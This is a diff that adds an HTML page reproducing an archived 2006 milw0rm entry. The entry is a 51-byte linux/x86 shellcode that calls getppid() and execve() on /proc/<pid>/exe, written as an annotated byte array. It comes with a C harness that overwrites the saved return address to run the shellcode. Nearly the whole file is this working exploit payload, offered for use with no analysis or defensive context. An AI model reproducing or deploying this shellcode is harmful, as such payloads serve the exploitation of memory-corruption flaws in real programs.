@@ -1,0 +1,45 @@
+<html><head><title>linux/x86 getppid() + execve(/proc/pid/exe) 51 bytes</title></head><pre>/*
+ * (linux/x86) getppid() + execve(&quot;/proc/&lt;pid&gt;/exe&quot;, [&quot;/proc/&lt;pid&gt;/exe&quot;, NULL]) - 51 bytes
+ * - izik &lt;izik@tty64.org&gt; 
+ */
+
+char shellcode[] = 
+
+	&quot;\x6a\x40&quot;              // push $0x40 
+	&quot;\x58&quot;                  // pop %eax 
+	&quot;\xcd\x80&quot;              // int $0x80 
+
+	//
+	// &lt;_convert&gt;:
+	//
+
+	&quot;\x4c&quot;                  // dec %esp 
+	&quot;\x99&quot;                  // cltd 
+	&quot;\x6a\x0a&quot;              // push $0xa 
+	&quot;\x5b&quot;                  // pop %ebx 
+	&quot;\xf7\xf3&quot;              // div %ebx 
+	&quot;\x80\xc2\x30&quot;          // add $0x30,%dl 
+	&quot;\x88\x14\x24&quot;          // mov %dl,(%esp) 
+	&quot;\x85\xc0&quot;              // test %eax,%eax 
+	&quot;\x75\xef&quot;              // jnz _convert
+	&quot;\x99&quot;                  // cltd 
+	&quot;\x5b&quot;                  // pop %ebx 
+	&quot;\x52&quot;                  // push %edx 
+	&quot;\x68\x2f\x65\x78\x65&quot;  // push $0x6578652f 
+	&quot;\x53&quot;                  // push %ebx 
+	&quot;\x68\x72\x6f\x63\x2f&quot;  // push $0x2f636f72 
+	&quot;\x68\x2f\x2f\x2f\x70&quot;  // push $0x702f2f2f 
+	&quot;\xb0\x0b&quot;              // mov $0xb,%al 
+	&quot;\x89\xe3&quot;              // mov %esp,%ebx 
+	&quot;\x52&quot;                  // push %edx 
+	&quot;\x53&quot;                  // push %ebx 
+	&quot;\x89\xe1&quot;              // mov %esp,%ecx 
+	&quot;\xcd\x80&quot;;             // int $0x80 
+
+int main(int argc, char **argv) {
+	int *ret;
+	ret = (int *)&amp;ret + 2;
+	(*ret) = (int) shellcode;
+}
+
+// milw0rm.com [2006-01-21]</pre></html>
